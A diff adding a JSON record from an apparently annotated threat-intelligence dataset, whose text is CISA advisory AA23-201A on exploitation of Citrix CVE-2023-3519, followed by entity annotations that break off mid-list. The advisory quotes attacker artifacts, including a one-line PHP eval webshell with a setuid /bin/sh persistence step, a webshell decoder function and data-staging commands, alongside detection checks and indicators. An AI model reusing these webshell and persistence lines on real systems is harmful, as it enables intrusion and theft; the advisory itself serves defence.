@@ -1,0 +1,1203 @@
+{
+  "doc_id": "aa23-201a",
+  "schema_version": "chapter3-no-capec-v1",
+  "annotation_protocol_version": "4.6-mcpu-mention-fact-dual-layer-v1",
+  "annotation_status": "v4.5_human_reannotated_adjudicated",
+  "gold_review": {
+    "kind": "human reannotation and adjudication",
+    "formal_human_iaa": false,
+    "prediction_outputs_used": false,
+    "configuration_boundary": {
+      "version": "configuration-mcpu-v2",
+      "prediction_outputs_used": false,
+      "policy_file": "config/configuration_boundary_mcpu_v2.json"
+    }
+  },
+  "text": "Threat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells | CISA\nSkip to main content\n \nOfficial websites use .gov\n A \n.gov\n website belongs to an official government organization in the United States.\nSecure .gov websites use HTTPS\n A \nlock\n (\n) or \nhttps://\n means you’ve safely connected to the .gov website. Share sensitive information only on official, secure websites.\nStaying Secure at Events\nno-cost Cyber Services\nSecure by design \nSecure Your Business\nReport A Cyber Issue\n \nShare:\nCybersecurity Advisory\nThreat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells\nRelease Date\nJuly 20, 2023\nAlert Code\nAA23-201A\n Related topics:\nCritical Infrastructure Security and Resilience\n ,\nInformation Sharing\n ,\nCyber Threats and Response\nSUMMARY\nUpdate September 6, 2023:\nThis Cybersecurity Advisory has been updated with new tactics, techniques, and procedures (TTPs) as well as indicators of compromise (IOCs) received from an additional victim and trusted third parties.\nUpdate End\nThe Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Cybersecurity Advisory to warn network defenders about exploitation of CVE-2023-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway. In June 2023, threat actors exploited this vulnerability as a zero-day to drop a webshell on a critical infrastructure organization’s non-production environment NetScaler ADC appliance. The webshell enabled the actors to perform discovery on the victim’s active directory (AD) and collect and exfiltrate AD data. The actors attempted to move laterally to a domain controller but network-segmentation controls for the appliance blocked movement.\nThe victim organization identified the compromise and reported the activity to CISA and Citrix. Citrix released a patch for this vulnerability on July 18, 2023.\nThis advisory provides TTPs and detection methods shared with CISA by the victim. CISA encourages critical infrastructure organizations to use the detection guidance included in this advisory for help with determining system compromise. If potential compromise is detected, organizations should apply the incident response recommendations provided in this CSA. If no compromise is detected, organizations should immediately apply patches provided by Citrix.\nDownload the PDF version of this report:\nAA23-201A Threat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells\n(PDF, 560.29 KB\n )\nUpdate September 6, 2023:\nIn August 2023, CISA received TTPs and IOCs from an additional victim and trusted third parties. This CSA has been updated with the TTPs and IOCs to assist administrators with detecting and responding to this activity.\nFor a downloadable list of IOCs, see the following XML and JSON files:\nAA23-201A STIX XML\n(XML, 43.13 KB\n )\nAA23-201A STIX JSON\n(JSON, 40.09 KB\n )\nUpdate End\n \nTECHNICAL DETAILS\nNote:\n This advisory uses the \nMITRE ATT&CK for Enterprise\n framework, version 13. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s \nBest Practices for MITRE ATT&CK Mapping\n and CISA’s \nDecider Tool\n.\nOverview\nIn July 2023, a critical infrastructure organization reported to CISA that threat actors may have exploited a zero-day vulnerability in NetScaler ADC to implant a webshell on their non-production NetScaler ADC appliance. Citrix confirmed that the actors exploited a zero-day vulnerability: CVE-2023-3519. Citrix released a patch on July 18, 2023.[\n1\n]\nUpdate September 6, 2023:\nIn August 2023, CISA received TTPs and IOCs from an additional victim and third parties. The actors implanted a webshell, gained root level access to the compromised system, and performed discovery against the Active Directory (AD). For information, see the Victim 2 and Additional Observed Activity sections.\nUpdate End\nCVE-2023-3519\nCVE-2023-3519 is an unauthenticated RCE vulnerability affecting the following versions of NetScaler ADC and NetScaler Gateway:[\n1\n]\nNetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.13\nNetScaler ADC and NetScaler Gateway 13.0 before 13.0-91.13\nNetScaler ADC and NetScaler Gateway version 12.1, now end of life\nNetScaler ADC 13.1-FIPS before 13.1-37.159\nNetScaler ADC 12.1-FIPS before 12.1-55.297\nNetScaler ADC 12.1-NDcPP before 12.1-55.297\nThe affected appliance must be configured as a Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or authentication, authorization, and auditing (AAA) virtual server for exploitation.[\n1\n]\nCISA added CVE-2023-3519 to its \nKnown Exploited Vulnerabilities Catalog\n on July 19, 2023.\nThreat Actor Activity\nVictim 1\nAs part of their initial exploit chain [\nT1190\n], the threat actors uploaded a TGZ file [\nT1105\n] containing a generic webshell [\nT1505.003\n], discovery script [\nTA0007\n], and \nsetuid\n binary [\nT1548.001\n] on the ADC appliance and conducted SMB scanning on the subnet [\nT1046\n].\nThe actors used the webshell for AD enumeration [\nT1016\n] and to exfiltrate AD data [\nTA0010\n]. Specifically, the actors:\nViewed NetScaler configuration files \n/flash/nsconfig/keys/updated/*\n and \n/nsconfig/ns.conf\n [\nT1005\n]. \nNote:\n These configuration files contain an encrypted password that can be decrypted by the key stored on the ADC appliance [\nT1552.001\n].\nViewed the NetScaler decryption keys (to decrypt the AD credential from the configuration file) [\nT1552.004\n].\nUsed the decrypted AD credential to query the AD via \nldapsearch\n. The actors queried for:\nUsers (\nobjectClass=user\n) (\nobjectcategory=person\n) [\nT1033\n]\nComputers (\nobjectClass=computer\n) [\nT1018\n]\nGroups (\nobjectClass=group\n) [\nT1069.002\n]\nSubnets (\nobjectClass=subnet\n)\nOrganizational Units (\nobjectClass=organizationalUnit\n)\nContacts (\nobjectClass=contact\n)\nPartitions (\nobjectClass=partition\n)\nTrusts (\nobjectClass=trustedDomain\n) [\nT1482\n]\nUsed the following command to encrypt discovery data collected via openssl in “tar ball” [\nT1560.001\n]: \ntar -czvf - /var/tmp/all.txt | openssl des3 -salt -k <> -out /var/tmp/test.tar.gz\n. (A “tar ball” is a compressed and zipped file used by threat actors for collection and exfiltration.)\nExfiltrated collected data by uploading as an image file [\nT1036.008\n] to a web-accessible path [\nT1074\n]: \ncp /var/tmp/test.tar.gz /netscaler/ns_gui/vpn/medialogininit.png\n.\nThe actors’ other discovery activities were unsuccessful due to the critical infrastructure organization’s deployment of their NetScaler ADC appliance in a segmented environment. The actors attempted to:\nExecute a subnet-wide curl command to identify what was accessible from within the network as well as potential lateral movement targets.\nVerified outbound network connectivity with a ping command (\nping -c 1 google.com\n) [\nT1016.001\n].\nExecuted host commands for a subnet-wide DNS lookup.\nThe actors also attempted to delete their artifacts [\nTA0005\n]. The actors deleted the authorization configuration file (\n/etc/auth.conf\n)—likely to prevent configured users (e.g., admin) from logging in remotely (e.g., CLI) [\nT1531\n]. To regain access to the ADC appliance, the organization would normally reboot into single use mode, which may have deleted artifacts from the device; however, the victim had a Secure Shell (SSH) key readily available that allowed them into the appliance without rebooting it.\nThe actors’ post-exploitation lateral movement attempts were also blocked by network-segmentation controls. The actors implanted a second webshell on the victim that they later removed. This was likely a PHP shell with proxying capability. The actors likely used this to attempt proxying SMB traffic to the DC [\nT1090.001\n] (the victim observed SMB connections where the actors attempted to use the previously decrypted AD credential to authenticate with the DC from the ADC via a virtual machine). Firewall and account restrictions (only certain internal accounts could authenticate to the DC) blocked this activity.\nUpdate September 6, 2023:\nVictim 2\nThreat actors uploaded a PHP webshell \n*logouttm.php*\n [\nT1036.005\n], likely as part of their initial exploit chain, to \n*/netscaler/ns_gui/vpn/\n. Within an hour of installing the webshell, the actors implanted an Executable and Linkable Format (ELF) binary \npykeygen\n that set user unique identifier (UID) to root and executed \n/bin/sh\n [\nT1059.004\n] via \nsetuid\n and \nexecve syscall.*\n [\nT1106\n]. \nNote:\n A third party also observed threat actors use an ELF binary (named\n pip4\n) to execute \n/bin/sh\n via \nsyscall\n and change the UID to root. \npip4\n was located at \n/var/python/bin\n.\nWith root level access, the actors used hands-on-keyboard for discovery. They queried the AD via \nldapsearch\n for users, groups, and computers. They collected the data in gzipped text files renamed \n1.css\n and \n2.css\n and placed the files in \n/netscaler/ns_gui/vpn/\n for exfiltration.\nAfter exfiltrating the files, the actors deleted them from the system [\nT1070.004\n] as well as some access logs, error logs, and authentication logs [\nT1070.002\n]. The victim organization detected the intrusion and mitigated the activity but did not identify signs of additional malicious activity.\nFor command and control (C2), the actors appeared to use compromised pfSense devices [\nT1584\n]; the victim observed communications with two pfSense IP addresses indicating the actor was using them for multi-hop proxying C2 traffic [\nT1090.003\n].\nAdditional Observed Activity\nAccording to trusted third party reporting, threat actors leveraged open source webshells and other publicly available tools [\nT1588.002\n]:\nLoaded \nloading[.]php\n to \n/vpn/vpn/\n. \nLoading[.]php\n is a modified version of an open-source PHP webshell [\n2\n]. The modified webshell had a custom protocol handler, \nupdate://\n, created via a \nstream_wrapper_register\n (https://www.php.net/manual/en/function.stream-wrapper-register[.]php). The custom protocol enabled the webshell to send encoded commands to the AD via \nldapsearch\n:\npublic function stream_open($path, $mode, $options, &$opened_path)\n   {\n       $this->code = hex2bin(substr(base64_decode(strrev(substr(substr($path,9),5))),2));\n       $this->position = 0;\n       return true;\n   }\nLoaded a modified version of open-source SSH inject tool [\n3\n] named libnsd.so to the \n/tmp\n directory. The file hooks SSH and captures credentials. The actors' modifications to the tool wrote encoded captured credentials (20 random characters + reversed/base64) to a file created in a hard-coded path (\n/var/nslog/counters/prometheus/metrc_codes_client.log\n) [\nT1074.001\n]. The actors then exfiltrated the collected credentials and deleted \n/var/nslog/counters/prometheus/metrc_codes_client.log\n 3 minutes after exfiltration). (The deleted file was recreated, possibly because the actors’ memory hook was still active.)\nDeployed webshells to victim networks at \n\\vpn\\themes\n.\nOne third party observed the actors deploy the SECRETSAUCE webshell. SECRETSAUCE is a webshell written in PHP. It can receive PHP code from an \nHTTP POST\n request, decrypt it using an internally embedded RSA public key [\nT1140\n], and execute the code in memory; each request to the webshell returns an \nHTTP 500\n response code. The actor has used the following file names for SECRETSAUCE: \nvpn[.]php\n, \nlogout[.]php\n, \nlog[.]php\n, \nprod[.]php\n [\nT1036\n].\nA second third party observed the actors deploy an open source webshell [\n4\n] with filename \ndefaults.php\n.\nDeployed LIGOLO-NG [\n5\n] tunneller with the filename \nthe\n in the \n/tmp\n directory. LIGOLO-NG is a tunneller [\nT1572\n] written in Go that provides encrypted reverse TCP/TLS connections [\nT1573.002\n] to a remote host.\nDeployed the NPS tunneller [\n6\n] to victim networks to the \n/tmp\n directory. NPS is an open source tunneller written in Go. It must be configured from the command line or via a configuration file. Features including support for most common protocols and extensions, including compression, encryption, and port reuse.\nAdditionally, threat actors:\nAppended \n/flash/nsconfig/rc.netscaler\n with:\nchmod u+s /bin/sh\necho “<?php http_response_code(401);@eval(\\$_REQUEST[‘variable’]);?>” > /[redacted path to webshell]/[redacted].php\n [\nT1222.002\n].\nThe webshell path was in a web accessible folder, and the actors’ modifications enabled them to run \n/bin/sh\n commands as root and enabled persistence because the webshell was run on every reboot [\nT1547\n].\nUsed Sysinternals ADExplorer, a Microsoft tool for viewing and editing the AD [\n7\n]. The actors dropped the tool to \nC:\\Users\\<redacted>\\AppData\\Local\\Temp\\\nADExplorer.exe\n and executed it with the following command: \nADExplorer.exe -snapshot \"\" <filename>.dat /accepteula\n.\nUpdate End\nMITRE ATT&CK TACTICS AND TECHNIQUES\nSee Table 1–Table 11 for all referenced threat actor tactics and techniques in this advisory.\nUpdate September 6, 2023\nThe tables have been updated with the following techniques:\nCompromise Infrastructure [\nT1584\n]\nObtain Capabilities: Tool [\nT1588.002\n]\nCommand and Scripting Interpreter: Unix Shell [\nT1059.004\n]\nNative API [\nT1106\n]\nBoot or Logon Autostart Execution [\nT1547\n]\nProxy: Multi-hop Proxy [\nT1090.003\n]\nDeobfuscate/Decode Files or Information [\nT1140\n]\nFile and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification [\nT1222.002\n]\nIndicator Removal [\nT1070\n]\nIndicator Removal: Clear Linux or Mac System Logs [\nT1070.002\n]\nIndicator Removal: File Deletion [\nT1070.004\n]\nMasquerading [\nT1036\n]\nMasquerading: Match Legitimate Name or Location [\nT1036.005\n]\nData Staged: Local Data Staging [\nT1074.001\n]\nProtocol Tunneling [\nT1572\n]\nEnd Update\nTable 1: Cyber Threat Actors ATT&CK Techniques for Resource Development\nTechnique Title\nID\nUse\nCompromise Infrastructure\nT1584\nThe threat actors appear to have used compromised pfSense devices to proxy C2 traffic to Victim 2.\nObtain Capabilities: Tool\nT1588.002\nThe threat actors leveraged open source webshells [\n2\n] [\n4\n] and other publicly available tools, including a modified version of open-source SSH inject tool [\n3\n], LIGOLO-NG [\n5\n] tunneller, and NPS tunneller [\n6\n].\n \nTable 2: Cyber Threat Actors ATT&CK Techniques for Initial Access\nTechnique Title\nID\nUse\nExploit Public-Facing Application\nT1190\nThe threat actors exploited CVE-2023-3519 to implant a webshell on the organization’s NetScaler ADC appliance.\n \nTable 3: Cyber Threat Actors ATT&CK Techniques for Execution\nTechnique Title\nID\nUse\nCommand and Scripting Interpreter: Unix Shell\nT1059.004\nThe threat actors executed \n/bin/sh\n as root.\nNative API\nT1106\nThe threat actors executed \n/bin/sh\n via \nsyscall\n.\n \nTable 4: Cyber Threat Actors ATT&CK Techniques for Persistence\nTechnique Title\nID\nUse\nBoot or Logon Autostart Execution\nT1547\nThreat actors used \n/flash/nsconfig/rc.netscaler\n rewrite a webshell on every reboot.\nServer Software Component: Web Shell\nT1505.003\nThe threat actors implanted a generic webshell on the organization’s NetScaler ADC appliance.\n \nTable 5: Cyber Threat Actors ATT&CK Techniques for Privilege Escalation\nTechnique Title\nID\nUse\nAbuse Elevation Control Mechanism: Setuid and Setgid\nT1548.001\nAs part of their initial exploit chain, the threat actors uploaded a TGZ file contain a \nsetuid\n binary on the ADC appliance.\n \nTable 6: Cyber Threat Actors ATT&CK Techniques for Defense Evasion\nTechnique Title\nID\nUse\nDeobfuscate/Decode Files or Information\nT1140\nThe threat actors deployed the SECRETSAUCE webshell, which can receive PHP code from an \nHTTP POST\n request, decrypt it using an internally embedded RSA public key.\nFile and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\nT1222.002\nThe threat actors appended \n/flash/nsconfig/rc.netscaler\n with:\nchmod u+s /bin/sh\necho “<?php http_response_code(401);@eval(\\$_REQUEST[‘variable’]);?>” > /[redacted path to webshell]/[redacted].php\n.\nIndicator Removal\nT1070\nThe threat actors deleted log files from Victim 2.\nIndicator Removal: Clear Linux or Mac System Logs\nT1070.002\nThe threat actors some access logs, error logs, and authentication logs from Victim 2.\nIndicator Removal: File Deletion\nT1070.004\nThe threat actors deleted collected files after exfiltrating them.\nMasquerading\nT1036\nThe actor has used the following file names for SECRETSAUCE to appear legitimate: \nvpn[.]php\n, \nlogout[.]php\n, \nlog[.]php\n, and \nprod[.]php\n.\nMasquerading: Match Legitimate Name or Location\nT1036.005\nThe threat actors named a webshell \n*logouttm.php*\n.\nMasquerading: Masquerade File Type\nT1036.008\nThe threat actors exfiltrated data by uploading it as an image file to a web-accessible path.\n \nTable 7: Cyber Threat Actors ATT&CK Techniques for Credential Access\nTechnique Title\nID\nUse\nUnsecured Credentials: Credentials In Files\nT1552.001\nThe threat actors obtained encrypted passwords from NetScaler ADC configuration files, and the decryption key was stored on the ADC appliance.\nUnsecured Credentials: Private Keys\nT1552.004\nThe threat actors obtained decryption keys to decrypt the AD credential obtained from the NetScaler ADC configuration files.\n \nTable 8: Cyber Threat Actors ATT&CK Techniques for Discovery\nTechnique Title\nID\nUse\nDomain Trust Discovery\nT1482\nThe threat actors queried the AD for trusts.\nPermission Groups Discovery: Domain Groups\nT1069.002\nThe threat actors quired the AD for groups.\nRemote System Discovery\nT1018\nThe threat actors queried the AD for computers.\nThe threat actors attempted to execute a subnet-wide curl command to identify what was accessible from within the network as well as potential lateral movement targets. Network-segmentation controls prevented this activity.\nSystem Network Configuration Discovery\nT1016\nThe actors used a webshell for AD enumeration.\nSystem Network Configuration Discovery: Internet Connection Discovery\nT1016.001\nThe threat actors attempted to verify outbound network connectivity with a ping command and executed host commands for a subnet-wide DNS lookup. Network-segmentation controls prevented this activity.\nNetwork Service Discovery\nT1046\nThe threat actors conducted SMB scanning on the organization’s subnet.\nAccount Discovery: Domain Account\nT1087.002\nThe threat actors queried the AD for users.\n \nTable 9: Cyber Threat Actors ATT&CK Techniques for Collection\nTechnique Title\nID\nUse\nArchive Collected Data: Archive via Utility\nT1560.001\nThe threat actors encrypted discovery data collected via openssl in “tar ball.”\nUpdate September 6, 2023:\nThe threat actors collected data in gzipped text files.\nEnd update\nData from Local System\nT1005\nThe threat actors viewed NetScaler ADC configuration files \nflash/nsconfig/keys/updated/*\n and \n/nsconfig/ns.conf\n.\nData Staged\nT1074\nThe threat actors uploaded data as an image file to a web-accessible path: \ncp /var/tmp/test.tar.gz /netscaler/ns_gui/vpn/medialogininit.png\n.\nData Staged: Local Data Staging\nT1074.001\nThe threat actors modified tool wrote captured credentials to a file created in a hard-coded path (\n/var/nslog/counters/ prometheus/metrc_codes_client.log\n).\n \nTable 10: Cyber Threat Actors ATT&CK Techniques for Command and Control\nTechnique Title\nID\nUse\nEncrypted Channel: Asymmetric Cryptography\nT1573.002\nThe threat actors deployed LIGOLO-NG, which is a tunneller that provides encrypted reverse TCP/TLS connections to a remote host.\nIngress Tool Transfer\nT1105\nThe threat actors exploited CVE-2023-3519 to upload a TGZ file containing a generic webshell, discovery script, and \nsetuid\n binary on the ADC appliance.\nProtocol Tunneling\nT1572\nThe threat actors deployed LIGOLO-NG and NPS tunnellers.\nProxy: Internal Proxy\nT1090.001\nThe actors likely used a PHP shell with proxying capability to attempt proxying SMB traffic to the DC (the traffic was blocked by a firewall and account restrictions).\nProxy: Multi-hop Proxy\nT1090.003\nThe threat actors appear to have used compromised pfSense devices to proxy C2 traffic to Victim 2.\n \nTable 11: Cyber Threat Actors ATT&CK Techniques for Impact\nTechnique Title\nID\nUse\nAccount Access Removal\nT1531\nThe threat actors deleted the authorization configuration file (\n/etc/auth.conf\n)—likely to prevent configured users from logging in remotely (e.g., CLI).\n \nDETECTION METHODS\nRun the following victim-created checks on the ADC shell interface to check for signs of compromise:\nCheck for files newer than the last installation.\nModify the \n-newermt\n parameter with the date that corresponds to your last installation:\nfind /netscaler/ns_gui/ -type f -name *.php -newermt [YYYYMMDD] -exec ls -l {} \\;\nfind /var/vpn/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;\nfind /var/netscaler/logon/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;\nfind /var/python/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;\nCheck http error logs for abnormalities that may be from initial exploit:\nzgrep '\\.sh' /var/log/httperror.log*\nzgrep '\\.php' /var/log/httperror.log*\nCheck shell logs for unusual \npost-ex\n commands, for example:\ngrep '/flash/nsconfig/keys' /var/log/sh.log*\nLook for \nsetuid\n binaries dropped:\nfind /var -perm -4000 -user root -not -path \"/var/nslog/*\" -newermt [YYYYMMDD] -exec ls -l {} \\;\nReview network and firewall logs for subnet-wide scanning of HTTP/HTTPS/SMB (80/443/445) originating from the ADC.\nReview DNS logs for unexpected spike in internal network computer name lookup originating from the ADC (this may indicate the threat actor resolving host post-AD enumeration of computer objects).\nReview network/firewall logs for unexpected spikes in AD/LDAP/LDAPS traffic originating from the ADC (this may indicate AD/LDAP enumeration).\nReview number of connections/sessions from NetScaler ADC per IP address for excessive connection attempts from a single IP (this may indicate the threat actor interacting with the webshell).\nPay attention to larger outbound transfers from the ADC over a short period of session time as it can be indicative of data exfiltration.\nReview AD logs for logon activities originating from the ADC IP with the account configured for AD connection. \nIf logon restriction is configured for the AD account, check event \n4625\n where the failure reason is “User not allowed to logon at this computer.”\nReview NetScaler ADC internal logs (\nsh.log*\n, \nbash.log*\n) for traces of potential malicious activity (some example keywords for \ngrep\n are provided below):\ndatabase.php\nns_gui/vpn\n/flash/nsconfig/keys/updated \nLDAPTLS_REQCERT \nldapsearch \nopenssl + salt\nReview NetScaler ADC internal access logs (\nhttpaccess-vpn.log*\n) for 200 successful access of unknown web resources.\nUpdate September 6, 2023:\nThe following resources may assist with detecting signs of compromise:\nMandiant: \nExploitation of Citrix Zero-Day by Possible Espionage Actors (CVE-2023-3519)\nGreyNoise: \nWill the real Citrix CVE-2023-3519 please stand up?\nShadowserver: \nTechnical Summary of Observed Citrix CVE-2023-3519 Incidents\nMandiant: \nIndicators of Compromise Scanner for Citrix ADC Zero-Day (CVE-2023-3519)\n(Update October 6, 2023)\n IBM: \nX-Force uncovers global NetScaler Gateway credential harvesting campaign\nEnd Update\n \nUpdate September 6, 2023\n:\nINDICATORS OF COMPROMISE\nSee Table 12 for IOCs obtained from Victim 2. (Note: a trusted third party observed the same PHP webshell and ELF binary hashes).\nTable 12: Victim 2-provided IOCs Affiliated with Citrix CVE-2023-3519 Exploitation\nFile Name\nDescription\nSHA-1 Hash\nMD5 Hash\nLogouttm[.]php\nPHP Webshell\n3345ad8b43d6771532ca55acf7e95fe98aeadb27\n47b8d29319a9e85aaf829f4f2f9c6c00\npykeygen\nELF Binary\nb8f9258e9c7c882944e2b773557b49e5821517fe\nee51f599d266be5fd89b423ca24521f1\n \nSee Table 13 and Table 14 for IOCs addresses obtained from trusted third parties.\nTable 13: Third-party Provided IP Addresses Affiliated with Citrix CVE-2023-3519 Exploitation\nIP Address\nDescription\nDate Observed\n5.2.64[.]155\nThreat actors used this to drop a webshell.\nJune 12, 2023\n5.255.101[.]76\nAttempted outbound connection to this C2 observed on a victim.\nLate June 2023\n172.94.124[.]18\nThreat actors used this infrastructure to remote into a victim network.\nJuly 20, 2023\n154.6.91[.]149\nThreat actors used this infrastructure to remote into a victim network.\nJuly 21, 2023\n \nTable 14: Third-party Provided IOCs Affiliated with Citrix CVE-2023-3519 Exploitation\nFile Name\nDescription\nSHA-1 Hash\nMD5 Hash\ninfo[.]php\nPHP Webshell\n55c83cb25be5c521e4874e22b1422c360abf0a29\nc0b32901f9c6ce3f965b8552f7d058d4\nNPS\nNPS tunneller [\n4\n]\nec17f7b3acb2334a062c37e0271c31c3c8b6879c\n9b6f12aed2369a99a1132edd2ede779d\nthe\nLIGOLO-NG [\n3\n] tunneller\ndec36a2aa4ecb86eafd01015e27c06f51d104317\nb383c4ed6712a0a06fb85b1d8405e0f1\nEnd Update\n \nINCIDENT RESPONSE\nIf compromise is detected, organizations should:\nQuarantine or take offline potentially affected hosts.\nReimage compromised hosts.\nProvision new account credentials.\nCollect and review artifacts such as running processes/services, unusual authentications, and recent network connections.\nReport the compromise to CISA via CISA’s 24/7 Operations Center (\nreport@cisa.gov\n or 1-844-Say-CISA).\nUpdate September 6, 2023:\nIf the threat actor used /flash/nsconfig/rc.netscaler to make /bin/sh a setuid binary and to rewrite a webshell on every reboot, organizations should clean rc.netscaler to prevent the webshell from getting rewritten by using the following third-party created command.\nroot@SOME-NETSCALER# cat /flash/nsconfig/rc.netscaler\n[redacted output]\nchmod u+s /bin/sh\necho \"<?php http_response_code(401);@eval(\\$_REQUEST['variable']);?>\" > /[redacted webshell path]/[redacted].php\n \nroot@SOME-NETSCALER# cat /[redacted webshell path]/[redacted].php\n<?php http_response_code(401);@eval($_REQUEST['variable']);?>\n \nMITIGATIONS\nCISA recommends all organizations:\nInstall the relevant updated version of NetScaler ADC and NetScaler Gateway\n as soon as possible. See \nCitrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\n for patch information.\nFollow best cybersecurity practices\n in your production and enterprise environments, including mandating \nphishing-resistant multifactor authentication (MFA)\n for all staff and for all services. For additional best practices, see CISA’s \nCross-Sector Cybersecurity Performance Goals\n (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of information technology (IT) and operational technology (OT) security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and ACSC also recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).\nAs a longer-term effort, \napply robust network-segmentation controls on NetScaler appliances\n, and other internet-facing devices.\n \nVALIDATE SECURITY CONTROLS\nIn addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.\nTo get started:\nSelect an ATT&CK technique described in this advisory (see Table 1–Table 11).\nAlign your security technologies against the technique.\nTest your technologies against the technique.\nAnalyze your detection and prevention technologies’ performance.\nRepeat the process for all security technologies to obtain a set of comprehensive performance data.\nTune your security program, including people, processes, and technologies, based on the data generated by this process.\nCISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.\n \nREFERENCES\n[1] Citrix Security Bulletin CTX561482: \nCitrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\nUpdate September 6, 2023:\n[2] \nGitHub - dxkite/php-stream-shell: a simple stream_wrapper shell\n[3] \nGitHub - ssh-inject/injectme.c\n[4] \nGitHub - L-codes/Neo-reGeorg: Neo-reGeorg is a project that seeks to aggressively refactor reGeorg\n[5] \nGitHub - nicocha30/ligolo-ng\n[6] \nGitHub - ehang-io/nps\n[7] Microsoft: \nAD Explorer - Sysinternals\nEnd Update\n \nUpdate September 6, 2023:\nACKNOWLEDGEMENTS\nMandiant and Shadowserver contributed to this Cybersecurity Advisory.\nEnd Update\n \nVERSION HISTORY\nJuly 20, 2023:\n Initial version.\nJuly 24, 2023:\n Updated affected NetScaler ADC 12.1-FIPS and NetScaler ADC 12.1-NDcPP version numbers. Updated Step 3 in Detection Methods to use \nzgrep\n instead of \ngrep\n.\nSeptember 6, 2023: \nUpdates noted throughout.\nSeptember 21, 2023:\n Removed persistence commands and associated technique for tampering with security tools.\nOctober 6, 2023:\n Updated resources in Detection Methods section\nThis product is provided subject to this \nNotification\n and this \nPrivacy & Use\n policy.\nTags\nMITRE ATT&CK TTP\n:\n Collection (TA0009),\n Command and Control (TA0011),\n Credential Access (TA0006),\n Defense Evasion (TA0005),\n Discovery (TA0007),\n Execution (TA0002),\n Impact (TA0040),\n Initial Access (TA0001),\n Persistence (TA0003),\n Privilege Escalation (TA0004),\n Resource Development (TA0042)\nTopics\n:\nCritical Infrastructure Security and Resilience\n,\nCyber Threats and Response\n,\nInformation Sharing\nPlease share your thoughts\nWe recently updated our anonymous \nproduct survey\n; we welcome your feedback.\nRelated Advisories\nApr 23, 2026\nCybersecurity Advisory | AA26-113A\nDefending Against China-Nexus Covert Networks of Compromised Devices\n \nApr 07, 2026\nCybersecurity Advisory | AA26-097A\nIranian-Affiliated Cyber Actors Exploit Programmable Logic Controllers Across US Critical Infrastructure\n \nDec 09, 2025\nCybersecurity Advisory | AA25-343A\nPro-Russia Hacktivists Conduct Opportunistic Attacks Against US and Global Critical Infrastructure\n \nAug 27, 2025\nCybersecurity Advisory | AA25-239A\nCountering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System",
+  "entities": [
+    {
+      "id": "E1",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 32,
+      "end": 45,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Threat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells | CISA\n"
+    },
+    {
+      "id": "E2",
+      "text": "CVE-2023-3466",
+      "type": "Vulnerability",
+      "start": 25963,
+      "end": 25976,
+      "normalized_id": "CVE-2023-3466",
+      "evidence": "Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\n"
+    },
+    {
+      "id": "E3",
+      "text": "CVE-2023-3467",
+      "type": "Vulnerability",
+      "start": 25978,
+      "end": 25991,
+      "normalized_id": "CVE-2023-3467",
+      "evidence": "Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\n"
+    },
+    {
+      "id": "E4",
+      "text": "T1552.001",
+      "type": "AttackTechnique",
+      "start": 5478,
+      "end": 5487,
+      "normalized_id": "T1552.001",
+      "evidence": "T1552.001\n"
+    },
+    {
+      "id": "E5",
+      "text": "T1033",
+      "type": "AttackTechnique",
+      "start": 5748,
+      "end": 5753,
+      "normalized_id": "T1033",
+      "evidence": "T1033\n"
+    },
+    {
+      "id": "E6",
+      "text": "T1584",
+      "type": "AttackTechnique",
+      "start": 9430,
+      "end": 9435,
+      "normalized_id": "T1584",
+      "evidence": "T1584\n"
+    },
+    {
+      "id": "E7",
+      "text": "T1018",
+      "type": "AttackTechnique",
+      "start": 5793,
+      "end": 5798,
+      "normalized_id": "T1018",
+      "evidence": "T1018\n"
+    },
+    {
+      "id": "E8",
+      "text": "T1090.003",
+      "type": "AttackTechnique",
+      "start": 9576,
+      "end": 9585,
+      "normalized_id": "T1090.003",
+      "evidence": "T1090.003\n"
+    },
+    {
+      "id": "E9",
+      "text": "T1069.002",
+      "type": "AttackTechnique",
+      "start": 5832,
+      "end": 5841,
+      "normalized_id": "T1069.002",
+      "evidence": "T1069.002\n"
+    },
+    {
+      "id": "E10",
+      "text": "T1531",
+      "type": "AttackTechnique",
+      "start": 7235,
+      "end": 7240,
+      "normalized_id": "T1531",
+      "evidence": "T1531\n"
+    },
+    {
+      "id": "E11",
+      "text": "T1087.002",
+      "type": "AttackTechnique",
+      "start": 18290,
+      "end": 18299,
+      "normalized_id": "T1087.002",
+      "evidence": "T1087.002\n"
+    },
+    {
+      "id": "E12",
+      "text": "T1036.008",
+      "type": "AttackTechnique",
+      "start": 6398,
+      "end": 6407,
